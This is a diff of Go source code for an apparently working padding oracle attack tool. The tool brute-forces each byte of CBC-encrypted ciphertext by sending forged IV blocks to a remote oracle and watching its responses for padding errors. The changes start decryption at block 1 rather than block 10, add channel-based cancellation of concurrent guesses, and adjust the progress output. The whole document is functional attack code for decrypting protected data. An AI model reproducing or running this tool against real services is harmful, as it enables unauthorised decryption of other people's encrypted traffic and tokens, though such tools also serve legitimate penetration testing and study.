@@ -41,7 +41,7 @@ func PadOperations(wg *sync.WaitGroup, cfg Config, cipherText []byte, decipherCh
 	}
 	endBlock := len(Blocks)
 	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
-	startBlock := 10
+	startBlock := 1
 	for blockNum, blockData := range Blocks[startBlock:endBlock] {
 		wg2.Add(1)
 		go PerBlockOperations(&wg2, cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
@@ -58,6 +58,7 @@ func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, 
 	var strData string
 	var outData string
 	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
+	bar.Empty = ' '
 	bar.PrependFunc(func(b *uiprogress.Bar) string {
 		return strData
 	})
@@ -70,30 +71,32 @@ func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, 
 	decipheredBlockBytes := []byte{}
 	wg2 := sync.WaitGroup{}
 	for byteNum, _ := range blockData { // Iterate over each byte
+		continueChan := make(chan bool, 1)
+
 		wg2.Add(1)
-		var found bool
+		// var found bool
 		// Iterate through each possible byte value until padding error goes away
 		for _, i := range rangeData {
-
-			data := WriteData{ByteNum: byteNum, Deciphered: hex.EncodeToString(decipheredBlockBytes), ByteValue: fmt.Sprintf("%x", i), BlockData: string(blockData), BlockNum: blockNum, NumBlocks: cfg.NumBlocks}
-			strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", data.BlockNum, g.Sprintf("%v", data.Deciphered), y.Sprintf("%02s", data.ByteValue), b.Sprintf("%x", data.BlockData[data.ByteNum+1:len(data.BlockData)]))
+			var found bool = false
+			strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), y.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
 			threadCh <- struct{}{}
 			if blockNum == cfg.NumBlocks-1 && byteNum == 0 { // Edge case for the VERY LAST byte of ciphertext;
-				// this one will ALWAYS allow 0x01 to be valid (as 1 byte of padding in the final block is always a valid value)
-				// Additionally, there's a 1/256 chance that 0x02 will be valid
-				// The probability of each successive value is exponential, so we can probably assume it's not likely
-				found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
+				// 	// this one will ALWAYS allow 0x01 to be valid (as 1 byte of padding in the final block is always a valid value)
+				// 	// Additionally, there's a 1/256 chance that 0x02 will be valid
+				// 	// The probability of each successive value is exponential, so we can probably assume it's not likely
+				found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
 			} else {
-				go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
+				go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
 			}
 			if found {
 				break
 			}
 		}
 		nextByte := <-blockDecipherChan
+		strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), r.Sprintf("%02x", nextByte), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
+
 		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
 		bar.Incr()
-
 		wg2.Wait()
 	}
 	returnData.BlockNumber = blockNum
@@ -110,30 +113,37 @@ func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, 
 }
 
 // PerByteOperations performs the actual math on each byte of the CipherText
-func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte) bool {
+func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
 	defer func() {
 		<-threadCh // Release a thread once we're done with this goroutine
 	}()
-	var RawOracleData []byte
-	// Math here - all the XORing and building of weird padding happens in these routines
-	padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
-	searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
-	tmp := XORBytes(searchBlock, IV)
-	oracleIvBlock := XORBytes(tmp, padBlock)
+	select {
+	case <-continueChan:
+		return false
+	default:
+		var RawOracleData []byte
+		// Math here - all the XORing and building of weird padding happens in these routines
+		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
+		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
+		tmp := XORBytes(searchBlock, IV)
+		oracleIvBlock := XORBytes(tmp, padBlock)
 
-	RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
-	// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
+		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
+		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
 
-	encodedPayload := EncodePayload(RawOracleData)
-	httpResp, strResponseBody := CallOracle(encodedPayload)
+		encodedPayload := EncodePayload(RawOracleData)
+		httpResp, strResponseBody := CallOracle(encodedPayload)
 
-	if CheckResponse(httpResp, strResponseBody) { // this one didn't return a pad error - we've probably decrypted it!
-		defer wg.Done()
-		blockDecipherChan <- byte(bruteForceByteValue)
-		if byteNum == cfg.BlockSize {
-			close(blockDecipherChan)
+		if CheckResponse(httpResp, strResponseBody) { // this one didn't return a pad error - we've probably decrypted it!
+			defer wg.Done()
+			continueChan <- true
+			close(continueChan)
+			blockDecipherChan <- byte(bruteForceByteValue)
+			if byteNum == cfg.BlockSize {
+				close(blockDecipherChan)
+			}
+			return true
 		}
-		return true
+		return false // This is to aid with detection of the final ciphertext's pad byte
 	}
-	return false // This is to aid with detection of the final ciphertext's pad byte
 }
